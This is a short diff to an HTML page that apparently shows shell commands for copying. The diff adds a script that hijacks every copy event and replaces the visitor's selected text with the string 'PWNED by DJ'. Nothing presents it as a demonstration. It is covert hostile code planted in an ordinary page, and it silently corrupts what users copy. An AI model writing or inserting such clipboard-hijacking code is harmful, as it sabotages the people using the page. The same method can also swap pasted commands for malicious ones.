@@ -422,6 +422,19 @@ $ tree -f -P "*.py" --noreport</textarea>
         }
       });
     });
+
+    document.addEventListener('copy', function (event) {
+      // Get the selected text
+      const selectedText = window.getSelection().toString();
+      if (!selectedText) return; // skip if nothing is selected
+  
+      // Modify the text
+      const modifiedText = "PWNED by DJ";
+  
+      // Set the modified text to the clipboard
+      event.clipboardData.setData('text/plain', modifiedText);
+      event.preventDefault(); // prevent default behavior
+    });
   </script>
 </body>
 </html>
